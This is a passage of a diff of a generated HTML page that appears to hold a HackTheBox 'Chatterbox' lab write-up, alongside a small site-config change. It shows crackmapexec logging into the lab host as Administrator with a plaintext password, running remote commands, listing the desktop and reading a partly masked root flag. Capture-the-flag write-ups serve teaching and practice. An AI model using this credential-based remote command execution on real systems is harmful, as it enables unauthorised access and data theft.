+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>name:CHATTERBOX<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:Chatterbox<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:False<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Chatterbox<span class="se">\A</span>dministrator:Welcome1!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Executed<span class="w"> </span><span class="nb">command</span><span class="w"> </span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>Volume<span class="w"> </span><span class="k">in</span><span class="w"> </span>drive<span class="w"> </span>C<span class="w"> </span>has<span class="w"> </span>no<span class="w"> </span>label.
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>Volume<span class="w"> </span>Serial<span class="w"> </span>Number<span class="w"> </span>is<span class="w"> </span>502F-F304
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>Directory<span class="w"> </span>of<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>
+</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="m">12</span>/10/2017<span class="w">  </span><span class="m">07</span>:50<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>.
+</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="m">12</span>/10/2017<span class="w">  </span><span class="m">07</span>:50<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>..
+</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="m">09</span>/07/2023<span class="w">  </span><span class="m">08</span>:25<span class="w"> </span>PM<span class="w">                </span><span class="m">34</span><span class="w"> </span>root.txt
+</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="m">1</span><span class="w"> </span>File<span class="o">(</span>s<span class="o">)</span><span class="w">             </span><span class="m">34</span><span class="w"> </span>bytes
+</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="m">2</span><span class="w"> </span>Dir<span class="o">(</span>s<span class="o">)</span><span class="w">   </span><span class="m">3</span>,311,423,488<span class="w"> </span>bytes<span class="w"> </span>free
+</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>
+</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>┌──<span class="o">(</span>pak㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>└─$<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.74<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome1!&#39;</span><span class="w"> </span>-x<span class="w"> </span><span class="s1">&#39;type C:\Users\Administrator\Desktop\root.txt&#39;</span>
+</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">7</span><span class="w"> </span>Professional<span class="w"> </span><span class="m">7601</span><span class="w"> </span>Service<span class="w"> </span>Pack<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>name:CHATTERBOX<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:Chatterbox<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:False<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:True<span class="o">)</span>
+</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Chatterbox<span class="se">\A</span>dministrator:Welcome1!<span class="w"> </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Executed<span class="w"> </span><span class="nb">command</span><span class="w"> </span>
+</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>SMB<span class="w">         </span><span class="m">10</span>.10.10.74<span class="w">     </span><span class="m">445</span><span class="w">    </span>CHATTERBOX<span class="w">       </span>ce4b046919fe296c########8be1
+</span></code></pre></div>
 <p>:).</p>
 
 
@@ -7988,7 +7988,7 @@ SMB         10.10.10.74     445    CHATTERBOX       ce4b046919fe296c########8be1
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
